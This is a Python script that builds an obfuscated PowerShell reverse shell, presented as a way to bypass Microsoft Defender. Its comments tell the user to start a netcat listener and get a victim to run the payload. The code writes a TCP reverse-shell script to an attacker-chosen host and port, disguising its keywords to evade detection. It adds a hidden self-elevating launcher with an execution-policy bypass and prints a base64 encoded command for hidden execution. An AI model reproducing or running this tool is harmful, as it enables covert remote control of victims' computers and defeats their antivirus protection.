import random
import time
import base64
import os
import argparse

# ---------------------------------------------------
#                                                    #
# AN OBFUSCATE PAYLOAD FOR BYPASS MICROSOFT DEFENDER #
# OPEN A LISTENER ON ANY PORT [nc -lvnp 1234.]       #
# MAKE SURE VICTIM RUNS IT, AND WAIT FOR A SHELL.    #
#                                                    #
# ---------------------------------------------------


# ---------------------  DEFINING COLORS ---------------------

Yellow = "\033[1;33;40m"
Red = "\033[1;31;40m"
Normal = "\033[0;0m"
l_cyan = '\033[96m'
Pink = '\033[95m'

def Code_Colors():
    global Yellow, Red, Normal, l_cyan, Pink

Code_Colors()

MAIN = "├──"
TEE2 = "└──"
SPACE_PREFIX = "   "


def JOKER():
    print(f'''
.------..------..------..------..------.
|{Yellow}P{Normal}.--. ||O.--. ||W.--. ||E.--. ||R.--. |
| :(): || :/\: || :/\: || (\/) || :(): |
| ()() || :\/: || :\/: || :\/: || ()() |
| '--'J|| '--'O|| '--'K|| '--'E|| '--'R|
`------'`------'`------'`------'`------''')


# -------------- USING PARSER LIBRARY --------------

parser = argparse.ArgumentParser(description="Why so serious?")
parser.add_argument('-l', '-local', type=str, required=True, help='Local Machine')
parser.add_argument('-p', '-port', type=int, required=True, help='On What Port To Connect')
args = parser.parse_args()

def Bomb():
    try:
        print(f"\n{Red}{MAIN}{Normal} Calculating Strings...")
        with open('Payload.ps1', 'r') as file:
            spl = file.read()
            time.sleep(1.5)
            print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Replace Randomly {len(spl)} Strings....")
            time.sleep(1.5)
            if "SYSTEMROOT" and "New-Object" and "GetStream" and "ASCII" and "System.Net.Sockets" not in spl:
                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}SYSTEMROOT - Replaced")
                time.sleep(1)
                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}New-Object - Replaced")
                time.sleep(1)
                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}GetStream - Replaced")
                time.sleep(1)
                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}System.Net.Sockets - Replaced")
                time.sleep(1)
                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{TEE2}{Pink}{Normal}Finishing it all...")
                time.sleep(1.5)
                print(f"{SPACE_PREFIX}{SPACE_PREFIX}{SPACE_PREFIX}{l_cyan}{TEE2}{Normal}Payload Generated...... ↓\n")
                time.sleep(1.5)

    except Exception as e:
        print(e)


# ------------ DMV GDE PDE GTG --------------------

Command1 = ['$a = IEX $env:', 'SystemRoot\SysWow64\??ndowsPowerShe??', '\\v1.0\powershe??.exe;']
Command2 = ['$client = New-Object ', 'System.Net.Sockets.', 'TCPClient("0.0.0.0",0000)']
Command3 = ['$stream = ', '$client.GetStream();', '[byte[]]$bytes = 0..65535|%{0};']
Command4 = ['while(($i = $stream.Read($bytes, 0, $bytes.Length))',
'-ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']
Command5 = ['$data = (New-Object -TypeName System.Text.ASCIIEncoding)', '.GetString($bytes,0, $i);']

# --------------------- WORDS TO GET-OFF --------------------- #

# S//Y//S//T//E//M//R//O//O//T
WordCharSystem1 = ["SysTemROot", "Syste?????", "Syst??r??t", "SyS?em?oo?"
                   "SYSTEmRoot", "Sys???r???"
                   ]

# S//y//s//t//e//m//3//2
WordCharSystem2 = ["SysWoW??", "SYSW?W6?", "SySwO???", "SYSW????"
                   ]

# N//e//w//O//b//j//e//c//t
WordCharSystem3 = ["Ne''w-O''bje''ct", "N''ew-O''bj''ec''t", "N'e'W'-'o'B'J'e'C'T'",
                   "New-ObJeCt", "NeW-oBJeCT", "&('New'+'-ObJect')", "&('{0}{1}'-f 'New-', 'Object')",
                   ]

# S//y//s//t//e//m//.//N//e//t//.//S//o//c//k//e//t//s
WordCharSystem4 = ["Sy''st''em.Net.Soc''kets.TcPClIeNt", "SyS''tEm.Net.SoC''kE''tS.TCPCLIENT",
                   "Sy''St''Em.NeT.So''CkE''tS.TCpCLient", "('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')",
                   "('S'+ 'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPcliEnt')"
                   ]

# G//e//t//S//t//r//e//a//m
WordCharSystem5 = ["('Get'+'St'+'r'+'eam')", "('Get'+'Stream')", "('G'+'e'+'T'+'S','T'+'r'+'e'+'m')",
                   "('gEt'+'s'+'T'+'r'+'E'+'aM')", "('G'+'e'+'tStream')"
                   ]

# S//y//s//t//e//m//T//e//x//t//.//A//S//C//I//I//E//n//c//o//d//i//n//g
WordCharSystem6 = ["Sys''t''em.Te''xt.AS''CI''IEn''co''ding", "Sy''Ste''M.tExT.A''SCi''iEN''coding"
                   ]

# --------------------- Join List Together --------------------- #

C1 = ''.join(Command1).strip()
C2 = ''.join(Command2).strip()
C3 = ''.join(Command3).strip()
C4 = ''.join(Command4).strip()
C5 = ''.join(Command5).strip()
W = ', '.join(WordCharSystem1)
W2 = ', '.join(WordCharSystem2)
w3 = '. '.join(WordCharSystem3)

# --------------------- REPLACING --------------------- #

if "SYSTEMROOT" or "SystemRoot" in C1:
    repl = random.choice(WordCharSystem1)
if "SysWow64" in C1:
    repl2 = random.choice(WordCharSystem2)
if "New-Object" in C2:
    repl3 = random.choice(WordCharSystem3)
if "System.Net.Sockets" in C2:
    repl4 = random.choice(WordCharSystem4)
if "GetStream" in C3:
    repl5 = random.choice(WordCharSystem5)
if "System.Text.ASCIIEncoding" in C4:
    repl6 = random.choice(WordCharSystem6)

# --------------------- MAIN CODE ---------------------

privilege = '''
param([switch]$Elevated)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    Unblock-File '.\Privilege.ps1'
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
        # tried to elevate, did not work, aborting
    } else {
        Start-Process $env:''' + f'''{repl}\\''' + f'''\\{repl2}'''+'''\\??ndowsPowerShe??\\v1.0\powershe??.exe -Verb RunAs -ArgumentList ('-noprofile -WindowStyle hidden -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
$encodedCommand = 'BASE64_ENCODED_COMMAND_HERE'
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
'''

# --------------------- CONTINUE MAIN CODE BLOCK ---------------------


def Execute_privilege():
    with open('Privilege.ps1', 'w') as run:
        run.write(f'{privilege}')
    run.close()

def Execute_Payload():
    with open('Payload.ps1', 'w') as run2:
        run2.write(f"$ClIeNt = {repl3} {repl4}('{args.l}',{args.p});\n")
        run2.write(f"$StReAm = $CLIent.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
        run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $byteS.LeNgTh)) -ne 0)" + "{;\n")
        run2.write(f"$data = (New-Object -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
        run2.write('''$sendback = (iex ". { $DATA } 2>&1" | Ou''t-Str''ing ); $sendback2 = ${s`endbac`k} + 'JokerShell ' + (pwd).Path + '> ';\n''')
        run2.write("$sendbyte = ([text.encoding]::ASCII).GetBYTeS($sendback2);$stREaM.Write($sendbyte,0,$seNdByte.Length);$s.Flush()};$client.Close()\n")
        run2.close()


# -------------------------------- ENCODE TO BASE64 WHEN FINISH ------------------------------#
 #                                                                                             #
  #                                                                                             #
   # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def B64(FTD):
    with open(FTD, 'rb') as file:
        file_content = file.read()
    return base64.b64encode(file_content).decode('utf-8')

def main():
    Execute_privilege()
    Execute_Payload()
    JOKER()
    Bomb()
    FP = 'Payload.ps1'
    B64(FTD=FP)
    time.sleep(0.5)
    print(f"[+] {Yellow}TIP{Normal}: use as: powershell -w hidden -EncodedCommand [PAYLOAD]")
    print("PAYLOAD -> Copy and run:\n")
    os.system('iconv -f ASCII -t UTF-16LE Payload.ps1 | base64 -w 0')
    time.sleep(0.5)
    os.system("rm -r Payload.ps1")

if __name__ == '__main__':
    main()
